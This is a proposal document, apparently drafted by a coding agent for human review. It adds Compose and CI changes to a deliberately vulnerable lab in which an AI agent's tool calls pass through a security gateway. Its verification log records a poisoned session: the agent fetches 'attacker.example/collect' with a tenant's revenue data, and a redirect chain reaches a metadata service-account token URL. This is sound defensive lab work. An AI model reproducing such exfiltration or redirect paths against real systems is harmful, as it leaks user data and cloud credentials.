# Proposed Compose + CI changes (M2 T6) — for a human to apply

`docker-compose.yml` and `.github/workflows/ci.yml` are **hardened zones** (`AGENTS.md`). The coding
agent does not write them. It proposes here; a human reviews, applies, and commits — in its **own
commit**, separate from feature code. Delete this file once applied.

**Status: verified, not applied.** The Compose file below was brought up from a scratch copy of the
repo with `PROPOSED-POLICY.md` applied, in both modes, on Docker 20.10.21 / Compose 2.13.0. Evidence
is in [Verification](#verification). CI has **not** run it — CI can only run what is committed.

---

## Named red span — this commit makes `make up` red too, on purpose

Before T6, `main` was red in **hardened** mode only (T6.0: no `TOOLS_SECRET` passthrough). The T6
agent-side commit adds M2-N4's mode probe, and under the **current** Compose file the API has no
`GATEWAY_URL` and no gateway to ask. So it refuses to start in **both** modes:

    api: GATEWAY_URL is not set: cannot confirm the gateway agrees this stack is vulnerable (M2-N4)

This is the control behaving as designed: an absent answer must not count as agreement. Making the
probe optional when `GATEWAY_URL` is unset would bring back the exact fail-open T5 found in Rego. The
span **ends when this file is applied**. Found on contact, by running `make attack` against the
unapplied tree, not predicted. Recorded per the house rule.

---

## The decisions this file implements (T6 D1–D4, closed 2026-11-07 at task open)

Defined here because code comments cite them and the repo had no other home for them. These are
*T6's* decisions; `T6 D3` is unrelated to the threat model's D3 (OPA).

- **T6 D1 — topology.** One `bazaar` bridge, pinned subnet, fixtures at fixed IPs reached by name via
  `extra_hosts`; `agent` is a profile-gated one-shot; one `audit` volume, `1777` sticky; collector
  `/received` published on loopback. *Rejected:* a separate fixture network. It would partly close
  M2-N1 while the threat model declares that limit, so the code and the document would disagree.
- **T6 D2 — agent binary.** `AGENT_TAGS` build arg on an `agent` target, default empty = hardened, and
  the binary refuses to start on disagreement with `$HARDENED` or with the gateway. *Rejected:* both
  binaries in one image, picked at runtime. The hardened image would then carry `NaiveExecutor` on
  disk.
- **T6 D3 — mode agreement.** `HARDENED` parsed strictly in all three processes
  (`gateway/mode_vectors.json` is the shared grammar); gateway `/healthz` reports a boolean; the API
  **and the agent** probe it at startup and refuse on mismatch in **both** modes; the gateway demands
  `TOOLS_SECRET` only when hardened. **Departure from the plan's wording, recorded:** the plan says
  the mode-agreement check is *"extended … to secret presence"*. Presence is enforced **per service at
  boot**, not through the probe: each process already refuses without its own secret, and a
  `/healthz` field saying "I have a secret" would add nothing a refusal to boot does not. **Value**
  agreement (two different secrets) is **not** checked. It surfaces as a runtime 401 on the internal
  route. Declared residual.
- **T6 D4 — the metadata address.** `metadata.google.internal` only; the literal-IP spike was not run
  (see below).

---

## Apply order — the policy first, or nothing boots

The gateway's `boot()` refuses to start without `gateway/policy/{policy.rego,data.json,redact.json}`,
in **either** mode. The API now `depends_on` a healthy gateway, so applying this file before
`PROPOSED-POLICY.md` turns a red CI into a hung one.

1. **Apply `PROPOSED-POLICY.md`** (T5, its own commit). `make test-policy` → `PASS: 8/8`;
   `cd app && go test ./redact/...` turns green (T5's named red span ends).
2. **Apply this file** (T6, its own commit):
   - replace `docker-compose.yml` with [section 1](#1-docker-composeyml);
   - apply the two-line change in [section 2](#2-githubworkflowsciyml-t60--pulled-forward-from-t8);
   - add the README layout amendment in [section 3](#3-readmemd--the-layout-amendment) — threat
     model §8 asks for the row *"in the same commit that creates"* the `collector` compose fixture,
     which is this one;
   - **delete the `M2 T0` entry from `PROPOSED-DEPS.md`** — both its base-image consumers now exist
     (`gateway/Dockerfile` at T5, `fixtures/Dockerfile` at T6), which is the event the plan named for
     clearing it. Its CI `opa test` snippet is not lost: `make test-policy` already runs it, and T8
     carries it into `ci.yml`.
3. `make up` → healthy; `JWT_SECRET=… TOOLS_SECRET=… make harden` → healthy; push; **CI green on
   `stack` and `attacks` for the first time since T3** (the T6.0 check).

---

## 1. `docker-compose.yml`

What changes, decision by decision:

| Change | Why |
|---|---|
| `api`: `TOOLS_SECRET`, `GATEWAY_URL`; `depends_on: gateway (healthy)`; `build.target: api` | **T6.0** — the passthrough whose absence has kept `main` red since T4. `GATEWAY_URL` feeds the M2-N4 mode probe. `target` is explicit because `app/Dockerfile` now has an `agent` stage too (the api stays the default last stage, so the old file still builds the right image — explicit beats positional). |
| `gateway` service | T5's sidecar. `HARDENED`, `TOOLS_SECRET`, `API_BASE_URL`; the `audit` volume; **not published** to the host. |
| `agent` service, `profiles: [agent]` | **T6 D1** — one session per `docker compose run`, never started by `up`. Runs in Compose because `attacker.example` only resolves there. Holds no `TOOLS_SECRET` (D5b). |
| `agent.build.args.AGENT_TAGS: "${AGENT_TAGS:-}"` | **T6 D2** — unset builds the **hardened** binary. `make up` sets `vulnerable`; the binary refuses to run if it disagrees with `$HARDENED` or with the gateway. |
| `mock-metadata`, `collector` — one `fixtures/` image, fixed IPs | **D6** — `extra_hosts` maps `metadata.google.internal` → `.20` and `attacker.example` → `.21` on every container that may fetch (`gateway`, `agent`). Pinned subnet `172.28.0.0/24`. |
| `collector` published on `127.0.0.1:9100` | So a host-side PoC can read `GET /received` (finding 03's evidence). Loopback, like every port. |
| `sysctls: net.ipv4.ip_unprivileged_port_start: "0"` | Fixtures run non-root on `:80` (the URLs in the writeups have no port). Docker sets this by default; set here so the dependency is visible rather than inherited. |
| `audit` volume | Both JSONL writers. Directory mode `1777` comes from `gateway/Dockerfile` (T6 D1): the agent can create `agent.jsonl` but cannot delete, rename or rewrite `gateway.jsonl`. |

```yaml
# BrokenBazaar — deliberately vulnerable. Localhost only.
# Every port is bound to 127.0.0.1 on purpose. Do not change that.
#
# HARDENED ENVIRONMENT: this file is a hardened zone (see CLAUDE.md).

# The two hostile fixtures are addressed BY NAME, from every container
# that may fetch (D6): the URLs read honestly in the writeups instead of
# as http://collector:9000/. Fixed IPs on a pinned subnet make the names
# stable. The literal 169.254.169.254 is NOT reachable -- that spike was
# not run (T6 D4); GCP addresses its metadata server by this name too.
x-fixture-hosts: &fixture-hosts
  - "metadata.google.internal:172.28.0.20"
  - "attacker.example:172.28.0.21"

services:
  db:
    image: postgres:16-alpine
    container_name: bb-db
    environment:
      POSTGRES_USER: bazaar
      POSTGRES_PASSWORD: bazaar
      POSTGRES_DB: bazaar
    ports:
      - "127.0.0.1:5432:5432"
    volumes:
      - db-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U bazaar -d bazaar"]
      interval: 3s
      timeout: 3s
      retries: 20
    networks: [bazaar]

  api:
    build:
      context: ./app
      dockerfile: Dockerfile
      target: api
    container_name: bb-api
    environment:
      HARDENED: "${HARDENED:-false}"
      JWT_SECRET: "${JWT_SECRET:-}"
      # D5b: the credential the gateway presents on the internal tool
      # route. No default, deliberately -- unset in hardened mode is a
      # startup panic naming the route (T6.0).
      TOOLS_SECRET: "${TOOLS_SECRET:-}"
      # M2-N4: the API probes the gateway's mode before serving and
      # refuses to start on a split brain.
      GATEWAY_URL: "http://gateway:8081"
      DATABASE_URL: "postgres://bazaar:bazaar@db:5432/bazaar?sslmode=disable"
    ports:
      - "127.0.0.1:8080:8080"
    depends_on:
      db:
        condition: service_healthy
      gateway:
        condition: service_healthy
    healthcheck:
      test: ["CMD", "/app/api", "-healthcheck"]
      interval: 5s
      timeout: 3s
      retries: 10
    networks: [bazaar]

  # The only thing that may execute a tool in hardened mode (D5). Not
  # published to the host: nothing outside the stack has a reason to
  # call /gate.
  gateway:
    build:
      context: ./gateway
    container_name: bb-gateway
    environment:
      HARDENED: "${HARDENED:-false}"
      TOOLS_SECRET: "${TOOLS_SECRET:-}"
      API_BASE_URL: "http://api:8080"
    volumes:
      - audit:/audit
    extra_hosts: *fixture-hosts
    healthcheck:
      test: ["CMD", "python3", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1:8081/healthz', timeout=2)"]
      interval: 3s
      timeout: 3s
      retries: 20
    networks: [bazaar]

  # One agent session per `docker compose run` (T6 D1) -- not a daemon.
  # Profile-gated, so `up` never starts it. Its binary is chosen at image
  # build time by AGENT_TAGS (T6 D2): unset builds HARDENED, and the
  # binary refuses to run if it disagrees with $HARDENED or with the
  # gateway (M2-N4). Holds no TOOLS_SECRET, by construction (D5b).
  agent:
    profiles: [agent]
    build:
      context: ./app
      dockerfile: Dockerfile
      target: agent
      args:
        AGENT_TAGS: "${AGENT_TAGS:-}"
    environment:
      HARDENED: "${HARDENED:-false}"
      GATEWAY_URL: "http://gateway:8081"
      DATABASE_URL: "postgres://bazaar:bazaar@db:5432/bazaar?sslmode=disable"
      AGENT_AUDIT_PATH: "/audit/agent.jsonl"
    volumes:
      - audit:/audit
    extra_hosts: *fixture-hosts
    depends_on:
      db:
        condition: service_healthy
      gateway:
        condition: service_healthy
    networks: [bazaar]

  # --- HOSTILE FIXTURES (M2, D6) -----------------------------------------
  # Same image, different script. Both listen on :80 unprivileged; the
  # sysctl is set here rather than inherited from Docker's default so the
  # dependency is visible.
  mock-metadata:
    build:
      context: ./fixtures
    container_name: bb-mock-metadata
    command: ["mock_metadata.py"]
    sysctls:
      net.ipv4.ip_unprivileged_port_start: "0"
    healthcheck:
      test: ["CMD", "python3", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1/', timeout=2)"]
      interval: 3s
      timeout: 3s
      retries: 20
    networks:
      bazaar:
        ipv4_address: 172.28.0.20

  collector:
    build:
      context: ./fixtures
    container_name: bb-collector
    command: ["collector.py"]
    sysctls:
      net.ipv4.ip_unprivileged_port_start: "0"
    # Published so a host-side PoC can read GET /received (finding 03's
    # evidence). Loopback only, like every port in this file.
    ports:
      - "127.0.0.1:9100:80"
    healthcheck:
      test: ["CMD", "python3", "-c", "import urllib.request; urllib.request.urlopen('http://127.0.0.1/received', timeout=2)"]
      interval: 3s
      timeout: 3s
      retries: 20
    networks:
      bazaar:
        ipv4_address: 172.28.0.21

  # --- Services below arrive with their modules ---------------------------
  # evil-mcp        (M4a) attacker-controlled MCP server        [hostile fixture]
  # evil-publisher  (M4b) mutable skill-reference host          [hostile fixture]

volumes:
  db-data:
  # Both JSONL writers append here: gateway.jsonl (gateway, uid 10001) and
  # agent.jsonl (vulnerable agent, uid 65532). The directory is 1777 from
  # the gateway image, so the agent can create its file but cannot delete,
  # rename or rewrite the gateway's (T6 D1).
  audit:

networks:
  bazaar:
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/24
```

**Not done, recorded:** the literal-`169.254.169.254` spike (T6 D4 — hostname now). The cheaper
variant to try first is a second network on a link-local subnet with `mock-metadata` at
`ipv4_address: 169.254.169.254`, which needs no `NET_ADMIN`/DNAT; it is only worth proposing once it
has run on both Docker Desktop and the CI runner.

**Declared residual (M2-N1 / R-M2-3, unchanged):** one bridge network — `api` and `db` can reach the
fixtures and the agent can reach Postgres. Compose cannot express egress policy; D1's topology
declares that limit rather than half-closing it with a second network.

---

## 2. `.github/workflows/ci.yml` (T6.0 — pulled forward from T8)

Both `make harden` steps set only `JWT_SECRET`. The API panics without `TOOLS_SECRET` in hardened
mode (the control working as designed); `make harden` now also fails fast without it.

```diff
       - name: hardened mode also starts
         run: |
-          JWT_SECRET=ci-only-not-a-secret make harden
+          JWT_SECRET=ci-only-not-a-secret TOOLS_SECRET=ci-only-not-a-secret-either make harden
           curl -fsS http://localhost:8080/healthz | grep -q '"hardened":true'
```

```diff
         - name: hardened mode -- every exploit must be BLOCKED
           run: |
-            JWT_SECRET=ci-only-not-a-secret make harden
+            JWT_SECRET=ci-only-not-a-secret TOOLS_SECRET=ci-only-not-a-secret-either make harden
             cd attacks && ./run.py --mode hardened --base-url http://localhost:8080
```

**Budget note (PROPOSED-DEPS M2 T0 predicted it):** `make up` now builds four images, not one. A
cold CI run is meaningfully slower. Not yet measured — the first green run is the measurement.

**Not in this change, on purpose:** the gateway and fixture Python suites, `opa test`, and
`verify-agent-images` in CI. Those are T8's workflow shape; this change is the minimum that ends the
undeliberate red span.

---

## 3. `README.md` — the layout amendment

`README.md` is not a hardened zone. The row goes in **this** commit only because §8 ties it to the
commit that creates the fixture service:

```diff
-| `fixtures/` | Attacker-controlled artifacts (`evil-mcp/`, `evil-skill/`) as first-class test data |
+| `fixtures/` | Attacker-controlled artifacts as first-class test data. M2 adds two Compose fixtures from one image: `collector` (`attacker.example`, the exfiltration sink finding 03 asserts against — **a layout amendment**: it was not in the M0 reservations, see `threat-models/m2-agent-gateway.md` D6) and `mock-metadata` (`metadata.google.internal`, finding 04). `evil-mcp/` (M4a) and `evil-skill/` (M4b) follow |
```

---

## Verification

Run from a scratch copy with `PROPOSED-POLICY.md` and section 1 applied.

**Vulnerable mode** (`make up`): all five services healthy; API probe accepted the gateway. The
seeded poisoned session, via `make agent MODE=vulnerable`:

    turn 1: tool read_document map[id:e07a1f1a-…]
    turn 2: tool http_fetch map[url:http://attacker.example/collect?data=Initech+%E2%80%94+Q3+revenue…]
    turn 3: answer

`GET 127.0.0.1:9100/received` → one record, `params.data` = the document's revenue line, decoded —
**`attacker.example` resolved to the collector and the tenant's bytes arrived.** `/audit`:
`drwxrwxrwt`, `agent.jsonl` (uid 65532, 4 lines), `gateway.jsonl` (uid 10001, **empty** — the gate
was never consulted, which is D4's measurement).

**The 302 chain (after review):** from inside the stack, `GET http://attacker.example/redirect` →
302 → final URL `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
body = the fake SA token; the collector's `/received` shows `['/redirect']`. The redirector works,
and the attacker sees the hit.

**Hardened mode:**
- `JWT_SECRET=x make harden` (no `TOOLS_SECRET`) → `make harden: TOOLS_SECRET is not set (D5b)`,
  exit 2. Bypassing the guard: the gateway exits 1 with `TOOLS_SECRET is not set`.
- With both secrets → healthy, `/healthz` reports `"hardened":true`.
- Poisoned session → `gateway.jsonl`:
  `pre http_fetch deny ['egress_not_allowlisted'] {host: attacker.example, ip: 172.28.0.21, denied_range: True}`;
  `pre read_document allow` + `post … ok` — **the hardened agent read a document end to end through
  gateway → internal route → `ForOrg` with `TOOLS_SECRET`.** Collector: `{"received": []}`.
- Clean control session → `read_document`, `answer`; zero fetches.
- `make agent MODE=vulnerable` against the hardened stack → `mode split brain: this process is
  vulnerable, gateway … reports hardened -- refusing to start (M2-N4)`.

---

## Costs found on contact, recorded rather than smoothed over

1. **Compose 2.13 hangs on an exited dependency.** With `TOOLS_SECRET` unset the gateway exits 1 at
   boot — correctly — and `docker compose up` then waits on `service_healthy` **forever** instead of
   failing. A missing secret would have surfaced in CI as a job timeout, not a named error. Newer
   Compose fails fast; the runner's version was not checked. Mitigated by the `make harden` guard,
   which is UX — the processes still enforce the rule themselves.
2. **An absent artifact read as a pass.** The first image check printed `NaiveExecutor=0` for
   **both** agent images: `docker cp` had failed, and `grep -c` counted an empty input. A green D5
   from no binary at all. `make verify-agent-images` now refuses on a missing file. Third instance in
   this module of the same class — T5's Rego `{}` fail-open, the mode probe's `*bool` — *a check
   whose input is missing must fail, not agree.*
3. **The 302 contract, corrected at review.** The plan says *"`mock-metadata` serves … a 302
   variant — the redirect is what makes 04 more than a string-match demo"*. Served from
   `metadata.google.internal` itself, it is not: the first URL already names the metadata host, so a
   string filter catches it. The spec review caught this. The collector now **also** serves
   `/redirect` (`attacker.example/redirect` → the token URL), whose first URL names no metadata host
   and which only per-hop re-evaluation stops. Both 302s ship; T7 picks the chain. **Declared limit:**
   in hardened mode the `attacker.example` chain dies at hop 1 (`egress_not_allowlisted`), so
   `fetch()`'s per-hop re-check is **not** exercised end to end in Compose. That would need an
   allowlisted host on a non-denied address, and every fixture sits in RFC1918 space. The per-hop
   check stays covered by `gateway/tools/test_tools.py`'s unit tests. T7 should not claim more.
4. **The volume's mode depends on mount order.** `1777` reaches the `audit` volume only because the
   gateway mounts it first while it is empty. Docker copies the image directory into a new volume
   once and never again. `depends_on` guarantees the order; nothing asserts it. If the agent ever
   mounted first, the volume would be root-owned `0755` and `NewAgentAudit` would fail loudly at
   startup. That is loud, not silent, but worth knowing.
5. **Sessions are stateful, and T7 must account for it.** Re-running the hardened agent on the
   session the vulnerable run had already used replayed that history — the final answer quoted the
   collector's earlier echo. Evidence from a reused session mixes runs. T7's PoCs need a fresh
   session per run (or must assert per-decision against `gateway.jsonl`, which is unaffected).

---

## Commit message

```
M2 T6: compose -- the gateway, the agent, two hostile fixtures, and T6.0

Human-applied hardened-zone change (AGENTS.md). Drafted by the agent in
PROPOSED-COMPOSE.md, reviewed and applied by hand.

docker-compose.yml: gateway, agent (profile), mock-metadata, collector;
TOOLS_SECRET + GATEWAY_URL passthrough (T6.0); fixed-IP fixtures by name
via extra_hosts (D6); shared audit volume (T6 D1).
ci.yml: TOOLS_SECRET on both `make harden` steps -- ends the red span
inherited since T4 (b2018c7).
PROPOSED-DEPS.md: M2 T0 entry deleted -- both base-image consumers exist.
README.md: fixtures/ layout row, in the commit that creates the
collector fixture (threat model §8).

Trust boundary: B5 (mediation topology), B7 (egress fixtures).
Plants a vulnerability: no (fixtures are the attack surface's targets).
Behind HARDENED: the agent binary is selected by AGENT_TAGS beside it.
```
